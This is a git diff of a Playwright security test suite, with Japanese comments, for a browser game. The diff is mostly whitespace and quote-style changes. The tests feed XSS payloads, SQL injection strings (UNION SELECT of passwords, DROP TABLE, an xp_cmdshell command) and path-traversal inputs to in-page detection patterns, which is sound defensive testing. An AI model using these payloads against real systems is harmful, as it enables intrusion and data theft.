@@ -6,7 +6,7 @@
 import { test, expect } from '@playwright/test';
 
 test.describe('データ整合性・セキュリティ包括テスト', () => {
-  
+
   test.beforeEach(async ({ page }) => {
     // セキュリティ・データ整合性監視スクリプトを注入
     await page.addInitScript(() => {
@@ -28,7 +28,7 @@ test.describe('データ整合性・セキュリティ包括テスト', () => {
           securityWarnings: 0
         }
       };
-      
+
       // 入力データの監視とサニタイゼーション検証
       window.testInputSanitization = (input, inputType) => {
         const result = {
@@ -39,7 +39,7 @@ test.describe('データ整合性・セキュリティ包括テスト', () => {
           sanitizedOutput: input,
           threats: []
         };
-        
+
         // XSS脅威検出
         const xssPatterns = [
           /<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi,
@@ -51,7 +51,7 @@ test.describe('データ整合性・セキュリティ包括テスト', () => {
           /eval\s*\(/gi,
           /expression\s*\(/gi
         ];
-        
+
         xssPatterns.forEach(pattern => {
           if (pattern.test(input)) {
             result.threats.push('XSS');
@@ -59,7 +59,7 @@ test.describe('データ整合性・セキュリティ包括テスト', () => {
             window.securityTestData.securityMetrics.securityWarnings++;
           }
         });
-        
+
         // SQLインジェクション検出
         const sqlPatterns = [
           /(\b(SELECT|INSERT|UPDATE|DELETE|DROP|CREATE|ALTER)\b)/gi,
@@ -69,7 +69,7 @@ test.describe('データ整合性・セキュリティ包括テスト', () => {
           /(\bOR\b.*=.*=)/gi,
           /(\bAND\b.*=.*=)/gi
         ];
-        
+
         sqlPatterns.forEach(pattern => {
           if (pattern.test(input)) {
             result.threats.push('SQL_INJECTION');
@@ -77,33 +77,33 @@ test.describe('データ整合性・セキュリティ包括テスト', () => {
             window.securityTestData.securityMetrics.securityWarnings++;
           }
         });
-        
+
         // パストラバーサル検出
         if (input.includes('../') || input.includes('..\\') || input.includes('%2e%2e%2f')) {
           result.threats.push('PATH_TRAVERSAL');
           result.isSafe = false;
           window.securityTestData.securityMetrics.securityWarnings++;
         }
-        
+
         // 不正な文字エンコーディング検出
         if (input.includes('%00') || input.includes('\x00')) {
           result.threats.push('NULL_BYTE_INJECTION');
           result.isSafe = false;
           window.securityTestData.securityMetrics.securityWarnings++;
         }
-        
+
         window.securityTestData.inputSanitization.push(result);
-        
+
         if (result.isSafe) {
           window.securityTestData.securityMetrics.passedValidations++;
         } else {
           window.securityTestData.securityMetrics.failedValidations++;
           window.securityTestData.securityMetrics.blockedAttacks++;
         }
-        
+
         return result;
       };
-      
+
       // データ整合性検証
       window.validateDataIntegrity = (data, expectedSchema) => {
         const result = {
@@ -114,7 +114,7 @@ test.describe('データ整合性・セキュリティ包括テスト', () => {
           violations: [],
           checksum: null
         };
-        
+
         // 型チェック
         if (expectedSchema.type && typeof data !== expectedSchema.type) {
           result.violations.push({
@@ -124,7 +124,7 @@ test.describe('データ整合性・セキュリティ包括テスト', () => {
           });
           result.isValid = false;
         }
-        
+
         // 範囲チェック
         if (typeof data === 'number') {
           if (expectedSchema.min && data < expectedSchema.min) {
@@ -144,7 +144,7 @@ test.describe('データ整合性・セキュリティ包括テスト', () => {
             result.isValid = false;
           }
         }
-        
+
         // 文字列長チェック
         if (typeof data === 'string') {
           if (expectedSchema.minLength && data.length < expectedSchema.minLength) {
@@ -164,7 +164,7 @@ test.describe('データ整合性・セキュリティ包括テスト', () => {
             result.isValid = false;
           }
         }
-        
+
         // パターンマッチング
         if (typeof data === 'string' && expectedSchema.pattern) {
           const regex = new RegExp(expectedSchema.pattern);
@@ -177,7 +177,7 @@ test.describe('データ整合性・セキュリティ包括テスト', () => {
             result.isValid = false;
           }
         }
-        
+
         // チェックサム計算（簡易版）
         if (typeof data === 'string') {
           let hash = 0;
@@ -188,45 +188,45 @@ test.describe('データ整合性・セキュリティ包括テスト', () => {
           }
           result.checksum = hash;
         }
-        
+
         window.securityTestData.dataValidationResults.push(result);
-        
+
         if (result.isValid) {
           window.securityTestData.securityMetrics.passedValidations++;
         } else {
           window.securityTestData.securityMetrics.failedValidations++;
           window.securityTestData.securityMetrics.dataInconsistencies++;
         }
-        
+
         return result;
       };
-      
+
       // ストレージセキュリティテスト
       window.testStorageSecurity = () => {
         const results = [];
-        
+
         // LocalStorage整合性テスト
         try {
           const testKey = 'security_test_' + Date.now();
           const testValue = 'test_value_' + Math.random();
-          
+
           localStorage.setItem(testKey, testValue);
           const retrievedValue = localStorage.getItem(testKey);
-          
+
           results.push({
             type: 'localStorage',
             operation: 'read_write',
             success: retrievedValue === testValue,
             timestamp: Date.now()
           });
-          
+
           localStorage.removeItem(testKey);
-          
+
           // 不正データ注入テスト
           const maliciousData = '<script>alert("XSS")</script>';
           localStorage.setItem(testKey + '_xss', maliciousData);
           const retrievedMaliciousData = localStorage.getItem(testKey + '_xss');
-          
+
           results.push({
             type: 'localStorage',
             operation: 'xss_injection',
@@ -235,9 +235,9 @@ test.describe('データ整合性・セキュリティ包括テスト', () => {
             sanitized: retrievedMaliciousData !== maliciousData,
             timestamp: Date.now()
           });
-          
+
           localStorage.removeItem(testKey + '_xss');
-          
+
         } catch (e) {
           results.push({
             type: 'localStorage',
@@ -246,24 +246,24 @@ test.describe('データ整合性・セキュリティ包括テスト', () => {
             timestamp: Date.now()
           });
         }
-        
+
         // SessionStorage整合性テスト
         try {
           const testKey = 'session_security_test_' + Date.now();
           const testValue = 'session_test_value_' + Math.random();
-          
+
           sessionStorage.setItem(testKey, testValue);
           const retrievedValue = sessionStorage.getItem(testKey);
-          
+
           results.push({
             type: 'sessionStorage',
             operation: 'read_write',
             success: retrievedValue === testValue,
             timestamp: Date.now()
           });
-          
+
           sessionStorage.removeItem(testKey);
-          
+
         } catch (e) {
           results.push({
             type: 'sessionStorage',
@@ -272,32 +272,32 @@ test.describe('データ整合性・セキュリティ包括テスト', () => {
             timestamp: Date.now()
           });
         }
-        
+
         // Cookie整合性テスト
         try {
           const testCookie = 'security_test_cookie=' + Math.random() + '; path=/';
           document.cookie = testCookie;
-          
+
           const cookieExists = document.cookie.includes('security_test_cookie');
-          
+
           results.push({
             type: 'cookie',
             operation: 'read_write',
             success: cookieExists,
             timestamp: Date.now()
           });
-          
+
           // HTTPOnlyフラグテスト
           const secureCookie = 'secure_test_cookie=' + Math.random() + '; path=/; HttpOnly; Secure';
           document.cookie = secureCookie;
-          
+
           results.push({
             type: 'cookie',
             operation: 'security_flags',
             httpOnlyTest: true,
             timestamp: Date.now()
           });
-          
+
         } catch (e) {
           results.push({
             type: 'cookie',
@@ -306,15 +306,15 @@ test.describe('データ整合性・セキュリティ包括テスト', () => {
             timestamp: Date.now()
           });
         }
-        
+
         window.securityTestData.storageSecurityTests = results;
         return results;
       };
-      
+
       // ネットワークセキュリティテスト
       window.testNetworkSecurity = async () => {
         const results = [];
-        
+
         // HTTPS強制チェック
         results.push({
           type: 'protocol',
@@ -322,19 +322,19 @@ test.describe('データ整合性・セキュリティ包括テスト', () => {
           protocol: location.protocol,
           timestamp: Date.now()
         });
-        
+
         // CSPヘッダーチェック
         try {
           const response = await fetch(location.href, { method: 'HEAD' });
           const cspHeader = response.headers.get('Content-Security-Policy');
-          
+
           results.push({
             type: 'csp',
             hasCSP: !!cspHeader,
             cspValue: cspHeader,
             timestamp: Date.now()
           });
-          
+
         } catch (e) {
           results.push({
             type: 'csp',
@@ -342,19 +342,19 @@ test.describe('データ整合性・セキュリティ包括テスト', () => {
             timestamp: Date.now()
           });
         }
-        
+
         // CORS設定チェック
         try {
           const corsTestUrl = 'http://example.com/test';
           await fetch(corsTestUrl, { mode: 'no-cors' });
-          
+
           results.push({
             type: 'cors',
             testUrl: corsTestUrl,
             blocked: false,
             timestamp: Date.now()
           });
-          
+
         } catch (e) {
           results.push({
             type: 'cors',
@@ -363,11 +363,11 @@ test.describe('データ整合性・セキュリティ包括テスト', () => {
             timestamp: Date.now()
           });
         }
-        
+
         window.securityTestData.networkSecurityTests = results;
         return results;
       };
-      
+
       // WebSocketセキュリティ検証
       window.validateWebSocketSecurity = (wsUrl) => {
         const result = {
@@ -376,27 +376,27 @@ test.describe('データ整合性・セキュリティ包括テスト', () => {
           isSecure: false,
           vulnerabilities: []
         };
-        
+
         // WSS (WebSocket Secure) チェック
         if (wsUrl && wsUrl.startsWith('wss://')) {
           result.isSecure = true;
         } else if (wsUrl && wsUrl.startsWith('ws://')) {
           result.vulnerabilities.push('UNENCRYPTED_CONNECTION');
         }
-        
+
         // オリジン検証
         if (wsUrl && !wsUrl.includes(location.hostname)) {
           result.vulnerabilities.push('CROSS_ORIGIN_WEBSOCKET');
         }
-        
+
         window.securityTestData.networkSecurityTests.push({
           type: 'websocket_security',
           ...result
         });
-        
+
         return result;
       };
-      
+
       // ゲームデータ整合性監視
       window.monitorGameDataIntegrity = () => {
         if (window.pyodide && window.pyodide.runPython) {
@@ -453,9 +453,9 @@ try:
 except Exception as e:
     json.dumps({'error': str(e), 'timestamp': ${Date.now()}})
             `));
-            
+
             window.securityTestData.integrityViolations.push(gameDataCheck);
-            
+
             // 整合性違反の検出
             if (gameDataCheck.checks) {
               gameDataCheck.checks.forEach(check => {
@@ -464,9 +464,9 @@ except Exception as e:
                 }
               });
             }
-            
+
             return gameDataCheck;
-            
+
           } catch (error) {
             console.error('Game data integrity monitoring error:', error);
             return null;
@@ -474,13 +474,13 @@ except Exception as e:
         }
         return null;
       };
-      
+
       // 定期的なセキュリティ監視
       setInterval(() => {
         window.monitorGameDataIntegrity();
       }, 2000);
     });
-    
+
     page.on('console', msg => {
       if (msg.type() === 'error') {
         console.log(`❌ セキュリティテストエラー: ${msg.text()}`);
@@ -492,9 +492,9 @@ except Exception as e:
 
   test('XSS・コードインジェクション完全防御テスト', async ({ page }) => {
     console.log('🛡️ XSS・コードインジェクション完全防御テストを開始...');
-    
+
     await page.goto('http://localhost:3000/docs/game.html');
-    
+
     // Pyodideの初期化を待つ
     try {
       const loadingOverlay = page.locator('#loadingOverlay');
@@ -503,7 +503,7 @@ except Exception as e:
     } catch (e) {
       console.log('⚠️ Pyodide初期化タイムアウト - セキュリティテストを継続');
     }
-    
+
     // XSS攻撃パターンテスト
     const xssPayloads = [
       '<script>alert("XSS")</script>',
@@ -532,25 +532,25 @@ except Exception as e:
       '<img/src=@ onerror=alert("XSS")>',
       '<script>setTimeout("alert(\'XSS\')",1000)</script>'
     ];
-    
+
     console.log('🧪 XSS攻撃パターンをテスト中...');
-    
+
     for (const payload of xssPayloads) {
       console.log(`  🔍 テスト中: ${payload.substring(0, 50)}...`);
-      
+
       // 各種入力フィールドでXSSペイロードをテスト
       const sanitizationResult = await page.evaluate((testPayload) => {
         return window.testInputSanitization(testPayload, 'xss_test');
       }, payload);
-      
+
       // XSS攻撃が適切にブロックされることを確認
       if (sanitizationResult.threats.includes('XSS')) {
         console.log(`  ✅ XSS攻撃をブロック: ${payload.substring(0, 30)}...`);
       }
-      
+
       await page.waitForTimeout(100);
     }
-    
+
     // SQLインジェクション攻撃パターンテスト
     const sqlInjectionPayloads = [
       "' OR '1'='1",
@@ -562,7 +562,7 @@ except Exception as e:
       "') OR '1'='1--",
       "' OR 'a'='a",
       "1' OR '1'='1",
-      "1; DROP TABLE users",
+      '1; DROP TABLE users',
       "'; INSERT INTO users VALUES ('hacker','password'); --",
       "' AND 1=0 UNION SELECT username, password FROM users --",
       "1' UNION SELECT null, username, password FROM users--",
@@ -574,45 +574,45 @@ except Exception as e:
       "'; DECLARE @cmd VARCHAR(255); SET @cmd='dir'; EXEC xp_cmdshell @cmd--",
       "' OR 1=1 AND ASCII(SUBSTRING(username,1,1))>64--"
     ];
-    
+
     console.log('🧪 SQLインジェクション攻撃パターンをテスト中...');
-    
+
     for (const payload of sqlInjectionPayloads) {
       console.log(`  🔍 テスト中: ${payload.substring(0, 50)}...`);
-      
+
       const sanitizationResult = await page.evaluate((testPayload) => {
         return window.testInputSanitization(testPayload, 'sql_injection_test');
       }, payload);
-      
+
       if (sanitizationResult.threats.includes('SQL_INJECTION')) {
         console.log(`  ✅ SQLインジェクション攻撃をブロック: ${payload.substring(0, 30)}...`);
       }
-      
+
       await page.waitForTimeout(100);
     }
-    
+
     // セキュリティテスト結果を収集
     const securityResults = await page.evaluate(() => window.securityTestData);
-    
+
     console.log('📊 セキュリティテスト結果:', {
       ブロックした攻撃: securityResults.securityMetrics.blockedAttacks,
       検証合格: securityResults.securityMetrics.passedValidations,
       検証失敗: securityResults.securityMetrics.failedValidations,
       セキュリティ警告: securityResults.securityMetrics.securityWarnings
     });
-    
+
     // セキュリティ基準の確認
     expect(securityResults.securityMetrics.blockedAttacks).toBeGreaterThan(0);
     expect(securityResults.securityMetrics.securityWarnings).toBeGreaterThan(0);
-    
+
     console.log('✅ XSS・コードインジェクション完全防御テスト完了');
   });
 
   test('データ検証・スキーマ整合性完全テスト', async ({ page }) => {
     console.log('📋 データ検証・スキーマ整合性完全テストを開始...');
-    
+
     await page.goto('http://localhost:3000/docs/game.html');
-    
+
     // Pyodideの初期化を待つ
     try {
       const loadingOverlay = page.locator('#loadingOverlay');
@@ -621,9 +621,9 @@ except Exception as e:
     } catch (e) {
       console.log('⚠️ Pyodide初期化タイムアウト');
     }
-    
+
     await page.waitForTimeout(3000);
-    
+
     // データ検証テストケース
     const dataValidationTests = [
       // スコア検証テスト
@@ -646,32 +646,32 @@ except Exception as e:
         description: '異常に高いスコア値'
       },
       {
-        data: "100",
+        data: '100',
         schema: { type: 'number', min: 0, max: 1000000 },
         expectedValid: false,
         description: '文字列型のスコア（型不整合）'
       },
       // プレイヤー名検証テスト
       {
-        data: "Player1",
+        data: 'Player1',
         schema: { type: 'string', minLength: 1, maxLength: 20, pattern: '^[a-zA-Z0-9_]+$' },
         expectedValid: true,
         description: '正常なプレイヤー名'
       },
       {
-        data: "",
+        data: '',
         schema: { type: 'string', minLength: 1, maxLength: 20 },
         expectedValid: false,
         description: '空のプレイヤー名'
       },
       {
-        data: "A".repeat(50),
+        data: 'A'.repeat(50),
         schema: { type: 'string', minLength: 1, maxLength: 20 },
         expectedValid: false,
         description: '長すぎるプレイヤー名'
       },
       {
-        data: "Player<script>",
+        data: 'Player<script>',
         schema: { type: 'string', minLength: 1, maxLength: 20, pattern: '^[a-zA-Z0-9_]+$' },
         expectedValid: false,
         description: '不正文字を含むプレイヤー名'
@@ -715,16 +715,16 @@ except Exception as e:
         description: '異常に高いレベル'
       }
     ];
-    
+
     console.log('🧪 データ検証テストを実行中...');
-    
+
     for (const testCase of dataValidationTests) {
       console.log(`  🔍 ${testCase.description}: ${JSON.stringify(testCase.data)}`);
-      
+
       const validationResult = await page.evaluate((data, schema) => {
         return window.validateDataIntegrity(data, schema);
       }, testCase.data, testCase.schema);
-      
+
       if (testCase.expectedValid) {
         expect(validationResult.isValid).toBe(true);
         console.log(`    ✅ 期待通り有効: ${testCase.description}`);
@@ -732,13 +732,13 @@ except Exception as e:
         expect(validationResult.isValid).toBe(false);
         console.log(`    ✅ 期待通り無効: ${testCase.description} (${validationResult.violations.map(v => v.type).join(', ')})`);
       }
-      
+
       await page.waitForTimeout(100);
     }
-    
+
     // ゲームデータ整合性の継続監視
     console.log('🎮 ゲームデータ整合性監視...');
-    
+
     // ゲーム操作でデータ整合性をテスト
     await page.keyboard.press('ArrowLeft');
     await page.waitForTimeout(500);
@@ -746,19 +746,19 @@ except Exception as e:
     await page.waitForTimeout(500);
     await page.keyboard.press('Space');
     await page.waitForTimeout(1000);
-    
+
     // 整合性違反の確認
     const integrityData = await page.evaluate(() => window.securityTestData.integrityViolations);
-    
+
     console.log('📊 データ整合性結果:', integrityData);
-    
+
     if (integrityData.length > 0) {
       const latestCheck = integrityData[integrityData.length - 1];
-      
+
       if (latestCheck.checks) {
         latestCheck.checks.forEach(check => {
           console.log(`  📋 ${check.type}: ${check.valid ? '✅ 正常' : '❌ 異常'}`);
-          
+
           if (check.type === 'score_integrity' || check.type === 'lives_integrity') {
             expect(check.valid).toBe(true);
             expect(check.bounds_check).toBe(true);
@@ -766,15 +766,15 @@ except Exception as e:
         });
       }
     }
-    
+
     console.log('✅ データ検証・スキーマ整合性完全テスト完了');
   });
 
   test('ストレージ・セッション管理セキュリティテスト', async ({ page }) => {
     console.log('💾 ストレージ・セッション管理セキュリティテストを開始...');
-    
+
     await page.goto('http://localhost:3000/docs/game.html');
-    
+
     // Pyodideの初期化を待つ
     try {
       const loadingOverlay = page.locator('#loadingOverlay');
@@ -783,63 +783,63 @@ except Exception as e:
     } catch (e) {
       console.log('⚠️ Pyodide初期化タイムアウト');
     }
-    
+
     await page.waitForTimeout(2000);
-    
+
     // ストレージセキュリティテストを実行
     console.log('🧪 ストレージセキュリティテストを実行中...');
-    
+
     const storageTestResults = await page.evaluate(() => {
       return window.testStorageSecurity();
     });
-    
+
     console.log('📊 ストレージテスト結果:', storageTestResults);
-    
+
     // LocalStorageセキュリティ検証
     const localStorageTests = storageTestResults.filter(result => result.type === 'localStorage');
-    
+
     localStorageTests.forEach(test => {
       console.log(`  📋 LocalStorage ${test.operation}: ${test.success ? '✅ 成功' : '❌ 失敗'}`);
-      
+
       if (test.operation === 'read_write') {
         expect(test.success).toBe(true);
       }
-      
+
       if (test.operation === 'xss_injection') {
         // XSSデータが適切に処理されることを確認
         console.log(`    🛡️ XSSインジェクション: 入力="${test.input.substring(0, 30)}..." 出力="${test.output ? test.output.substring(0, 30) : 'null'}..."`);
       }
     });
-    
+
     // SessionStorageセキュリティ検証
     const sessionStorageTests = storageTestResults.filter(result => result.type === 'sessionStorage');
-    
+
     sessionStorageTests.forEach(test => {
       console.log(`  📋 SessionStorage ${test.operation}: ${test.success ? '✅ 成功' : '❌ 失敗'}`);
-      
+
       if (test.operation === 'read_write') {
         expect(test.success).toBe(true);
       }
     });
-    
+
     // Cookieセキュリティ検証
     const cookieTests = storageTestResults.filter(result => result.type === 'cookie');
-    
+
     cookieTests.forEach(test => {
       console.log(`  📋 Cookie ${test.operation}: ${test.success ? '✅ 成功' : '❌ 失敗'}`);
-      
+
       if (test.operation === 'read_write') {
         expect(test.success).toBe(true);
       }
-      
+
       if (test.operation === 'security_flags') {
-        console.log(`    🔒 セキュリティフラグテスト: HttpOnlyテスト実行`);
+        console.log('    🔒 セキュリティフラグテスト: HttpOnlyテスト実行');
       }
     });
-    
+
     // ランキングデータ操作セキュリティテスト
     console.log('🏆 ランキングデータセキュリティテスト...');
-    
+
     // 不正なランキングデータ注入テスト
     const maliciousRankingData = [
       { name: '<script>alert("XSS")</script>', score: 1000 },
@@ -849,15 +849,15 @@ except Exception as e:
       { name: 'Normal', score: Infinity },
       { name: 'Test', score: NaN }
     ];
-    
+
     for (const maliciousData of maliciousRankingData) {
       console.log(`  🧪 不正データテスト: ${JSON.stringify(maliciousData).substring(0, 50)}...`);
-      
+
       // 名前の検証
       const nameValidation = await page.evaluate((name) => {
         return window.testInputSanitization(name, 'ranking_name');
       }, maliciousData.name);
-      
+
       // スコアの検証
       const scoreValidation = await page.evaluate((score) => {
         return window.validateDataIntegrity(score, {
@@ -866,24 +866,24 @@ except Exception as e:
           max: 1000000
         });
       }, maliciousData.score);
-      
+
       if (nameValidation.threats.length > 0) {
         console.log(`    ✅ 名前の脅威検出: ${nameValidation.threats.join(', ')}`);
       }
-      
+
       if (!scoreValidation.isValid) {
         console.log(`    ✅ スコア検証失敗: ${scoreValidation.violations.map(v => v.type).join(', ')}`);
       }
     }
-    
+
     console.log('✅ ストレージ・セッション管理セキュリティテスト完了');
   });
 
   test('ネットワーク通信セキュリティ完全テスト', async ({ page }) => {
     console.log('🌐 ネットワーク通信セキュリティ完全テストを開始...');
-    
+
     await page.goto('http://localhost:3000/docs/game.html');
-    
+
     // Pyodideの初期化を待つ
     try {
       const loadingOverlay = page.locator('#loadingOverlay');
@@ -892,29 +892,29 @@ except Exception as e:
     } catch (e) {
       console.log('⚠️ Pyodide初期化タイムアウト');
     }
-    
+
     await page.waitForTimeout(2000);
-    
+
     // ネットワークセキュリティテストを実行
     console.log('🧪 ネットワークセキュリティテストを実行中...');
-    
+
     const networkTestResults = await page.evaluate(async () => {
       return await window.testNetworkSecurity();
     });
-    
+
     console.log('📊 ネットワークセキュリティテスト結果:', networkTestResults);
-    
+
     // プロトコルセキュリティ検証
     const protocolTest = networkTestResults.find(result => result.type === 'protocol');
     if (protocolTest) {
       console.log(`  🔒 プロトコル: ${protocolTest.protocol} (HTTPS: ${protocolTest.isHTTPS ? '✅' : '⚠️'})`);
-      
+
       // 本番環境ではHTTPSが推奨だが、ローカル開発環境ではHTTPも許容
       if (protocolTest.protocol === 'http:' && !location.hostname.includes('localhost')) {
         console.log('⚠️ 本番環境でHTTPが使用されています');
       }
     }
-    
+
     // CSPヘッダー検証
     const cspTest = networkTestResults.find(result => result.type === 'csp');
     if (cspTest) {
@@ -923,63 +923,63 @@ except Exception as e:
         console.log(`    📋 CSP値: ${cspTest.cspValue}`);
       }
     }
-    
+
     // CORS設定検証
     const corsTest = networkTestResults.find(result => result.type === 'cors');
     if (corsTest) {
       console.log(`  🌐 CORS: ${corsTest.blocked ? '✅ 適切にブロック' : '⚠️ 制限なし'}`);
     }
-    
+
     // WebSocketセキュリティテスト
     console.log('🔌 WebSocketセキュリティテスト...');
-    
+
     const wsSecurityTests = [
       'ws://localhost:8765',
       'wss://localhost:8765',
       'ws://example.com:8765',
       'wss://secure.example.com:8765'
     ];
-    
+
     for (const wsUrl of wsSecurityTests) {
       console.log(`  🧪 WebSocketセキュリティテスト: ${wsUrl}`);
-      
+
       const wsSecurityResult = await page.evaluate((url) => {
         return window.validateWebSocketSecurity(url);
       }, wsUrl);
-      
+
       console.log(`    🔍 結果: セキュア=${wsSecurityResult.isSecure}, 脆弱性=${wsSecurityResult.vulnerabilities.length}件`);
-      
+
       if (wsSecurityResult.vulnerabilities.length > 0) {
         console.log(`    ⚠️ 脆弱性: ${wsSecurityResult.vulnerabilities.join(', ')}`);
       }
     }
-    
+
     // HTTPSリダイレクトテスト（ローカル環境では省略）
     if (!page.url().includes('localhost')) {
       console.log('🔄 HTTPSリダイレクトテスト...');
-      
+
       try {
         const httpUrl = page.url().replace('https://', 'http://');
         await page.goto(httpUrl);
-        
+
         // HTTPSにリダイレクトされることを確認
         await page.waitForTimeout(2000);
         const currentUrl = page.url();
-        
+
         if (currentUrl.startsWith('https://')) {
           console.log('✅ HTTPSリダイレクト正常');
         } else {
           console.log('⚠️ HTTPSリダイレクトが設定されていません');
         }
-        
+
       } catch (e) {
         console.log('⚠️ HTTPSリダイレクトテストエラー:', e.message);
       }
     }
-    
+
     // APIエンドポイントセキュリティテスト
     console.log('🔐 APIエンドポイントセキュリティテスト...');
-    
+
     const apiSecurityTests = [
       {
         method: 'GET',
@@ -998,11 +998,11 @@ except Exception as e:
         expectedStatusRange: [404] // Not Found
       }
     ];
-    
+
     for (const apiTest of apiSecurityTests) {
       try {
         console.log(`  🧪 APIテスト: ${apiTest.method} ${apiTest.endpoint}`);
-        
+
         const response = await page.evaluate(async (test) => {
           const options = {
             method: test.method,
@@ -1010,11 +1010,11 @@ except Exception as e:
               'Content-Type': 'application/json'
             }
           };
-          
+
           if (test.data) {
             options.body = JSON.stringify(test.data);
           }
-          
+
           try {
             const response = await fetch(test.endpoint, options);
             return {
@@ -1029,10 +1029,10 @@ except Exception as e:
             };
           }
         }, apiTest);
-        
+
         if (response.status) {
           console.log(`    📊 レスポンス: ${response.status} ${response.ok ? '✅' : '⚠️'}`);
-          
+
           // セキュリティヘッダーの確認
           const securityHeaders = [
             'X-Content-Type-Options',
@@ -1040,30 +1040,30 @@ except Exception as e:
             'X-XSS-Protection',
             'Strict-Transport-Security'
           ];
-          
+
           securityHeaders.forEach(header => {
             if (response.headers[header.toLowerCase()]) {
               console.log(`    🛡️ ${header}: ${response.headers[header.toLowerCase()]}`);
             }
           });
-          
+
         } else {
           console.log(`    ❌ エラー: ${response.error}`);
         }
-        
+
       } catch (e) {
         console.log(`    ⚠️ APIテストエラー: ${e.message}`);
       }
     }
-    
+
     console.log('✅ ネットワーク通信セキュリティ完全テスト完了');
   });
 
   test('入力検証・サニタイゼーション境界値テスト', async ({ page }) => {
     console.log('🔍 入力検証・サニタイゼーション境界値テストを開始...');
-    
+
     await page.goto('http://localhost:3000/docs/game.html');
-    
+
     // Pyodideの初期化を待つ
     try {
       const loadingOverlay = page.locator('#loadingOverlay');
@@ -1072,9 +1072,9 @@ except Exception as e:
     } catch (e) {
       console.log('⚠️ Pyodide初期化タイムアウト');
     }
-    
+
     await page.waitForTimeout(2000);
-    
+
     // 境界値テストパターン
     const boundaryTests = [
       // 数値境界値テスト
@@ -1161,47 +1161,47 @@ except Exception as e:
         schema: { type: 'string', minLength: 1, maxLength: 50 }
       }
     ];
-    
+
     console.log('🧪 境界値テストを実行中...');
-    
+
     for (const testCategory of boundaryTests) {
       console.log(`\n📋 ${testCategory.category}テスト:`);
-      
+
       for (const inputTest of testCategory.inputs) {
         console.log(`  🔍 ${inputTest.description}: "${inputTest.value}"`);
-        
+
         try {
           // 入力サニタイゼーションテスト
           const sanitizationResult = await page.evaluate((input) => {
             return window.testInputSanitization(input, 'boundary_test');
           }, inputTest.value);
-          
+
           // データ検証テスト
           const validationResult = await page.evaluate((input, schema) => {
             return window.validateDataIntegrity(input, schema);
           }, inputTest.value, testCategory.schema);
-          
+
           console.log(`    🛡️ サニタイゼーション: ${sanitizationResult.isSafe ? '✅ 安全' : '⚠️ 脅威検出'}`);
           if (sanitizationResult.threats.length > 0) {
             console.log(`      脅威: ${sanitizationResult.threats.join(', ')}`);
           }
-          
+
           console.log(`    📋 検証: ${validationResult.isValid ? '✅ 有効' : '❌ 無効'}`);
           if (validationResult.violations.length > 0) {
             console.log(`      違反: ${validationResult.violations.map(v => v.type).join(', ')}`);
           }
-          
+
         } catch (e) {
           console.log(`    ❌ テストエラー: ${e.message}`);
         }
-        
+
         await page.waitForTimeout(50);
       }
     }
-    
+
     // Unicode境界値テスト
     console.log('\n🌐 Unicode境界値テスト:');
-    
+
     const unicodeTests = [
       { codePoint: 0x0000, description: 'NULL' },
       { codePoint: 0x001F, description: '制御文字最大' },
@@ -1215,26 +1215,26 @@ except Exception as e:
       { codePoint: 0xFFFD, description: '置換文字' },
       { codePoint: 0xFFFF, description: 'BMP最大' }
     ];
-    
+
     for (const unicodeTest of unicodeTests) {
       const char = String.fromCharCode(unicodeTest.codePoint);
       console.log(`  🔍 U+${unicodeTest.codePoint.toString(16).padStart(4, '0')} (${unicodeTest.description})`);
-      
+
       const sanitizationResult = await page.evaluate((input) => {
         return window.testInputSanitization(input, 'unicode_test');
       }, char);
-      
+
       console.log(`    🛡️ ${sanitizationResult.isSafe ? '✅ 安全' : '⚠️ 脅威検出'}`);
     }
-    
+
     console.log('✅ 入力検証・サニタイゼーション境界値テスト完了');
   });
 
   test('セキュリティヘッダー・ポリシー検証テスト', async ({ page }) => {
     console.log('🔒 セキュリティヘッダー・ポリシー検証テストを開始...');
-    
+
     await page.goto('http://localhost:3000/docs/game.html');
-    
+
     // Pyodideの初期化を待つ
     try {
       const loadingOverlay = page.locator('#loadingOverlay');
@@ -1243,15 +1243,15 @@ except Exception as e:
     } catch (e) {
       console.log('⚠️ Pyodide初期化タイムアウト');
     }
-    
+
     // レスポンスヘッダーの確認
     console.log('🧪 セキュリティヘッダー検証中...');
-    
+
     const securityHeaders = await page.evaluate(async () => {
       try {
         const response = await fetch(location.href);
         const headers = {};
-        
+
         // セキュリティ関連ヘッダーを収集
         const securityHeaderNames = [
           'Content-Security-Policy',
@@ -1266,28 +1266,28 @@ except Exception as e:
           'Cross-Origin-Opener-Policy',
           'Cross-Origin-Resource-Policy'
         ];
-        
+
         securityHeaderNames.forEach(headerName => {
           headers[headerName] = response.headers.get(headerName);
         });
-        
+
         return headers;
       } catch (e) {
         return { error: e.message };
       }
     });
-    
+
     console.log('📊 セキュリティヘッダー検査結果:');
-    
+
     // Content Security Policy検証
     if (securityHeaders['Content-Security-Policy']) {
-      console.log(`  🛡️ CSP: ✅ 設定済み`);
+      console.log('  🛡️ CSP: ✅ 設定済み');
       console.log(`    📋 値: ${securityHeaders['Content-Security-Policy']}`);
-      
+
       // CSPディレクティブの解析
       const cspDirectives = securityHeaders['Content-Security-Policy'].split(';');
       const importantDirectives = ['default-src', 'script-src', 'style-src', 'img-src'];
-      
+
       importantDirectives.forEach(directive => {
         const found = cspDirectives.find(d => d.trim().startsWith(directive));
         if (found) {
@@ -1297,42 +1297,42 @@ except Exception as e:
         }
       });
     } else {
-      console.log(`  🛡️ CSP: ⚠️ 未設定`);
+      console.log('  🛡️ CSP: ⚠️ 未設定');
     }
-    
+
     // X-Content-Type-Options検証
     if (securityHeaders['X-Content-Type-Options']) {
       console.log(`  🛡️ X-Content-Type-Options: ✅ ${securityHeaders['X-Content-Type-Options']}`);
       expect(securityHeaders['X-Content-Type-Options']).toBe('nosniff');
     } else {
-      console.log(`  🛡️ X-Content-Type-Options: ⚠️ 未設定`);
+      console.log('  🛡️ X-Content-Type-Options: ⚠️ 未設定');
     }
-    
+
     // X-Frame-Options検証
     if (securityHeaders['X-Frame-Options']) {
       console.log(`  🛡️ X-Frame-Options: ✅ ${securityHeaders['X-Frame-Options']}`);
       expect(['DENY', 'SAMEORIGIN'].includes(securityHeaders['X-Frame-Options'])).toBe(true);
     } else {
-      console.log(`  🛡️ X-Frame-Options: ⚠️ 未設定`);
+      console.log('  🛡️ X-Frame-Options: ⚠️ 未設定');
     }
-    
+
     // Referrer-Policy検証
     if (securityHeaders['Referrer-Policy']) {
       console.log(`  🛡️ Referrer-Policy: ✅ ${securityHeaders['Referrer-Policy']}`);
     } else {
-      console.log(`  🛡️ Referrer-Policy: ⚠️ 未設定`);
+      console.log('  🛡️ Referrer-Policy: ⚠️ 未設定');
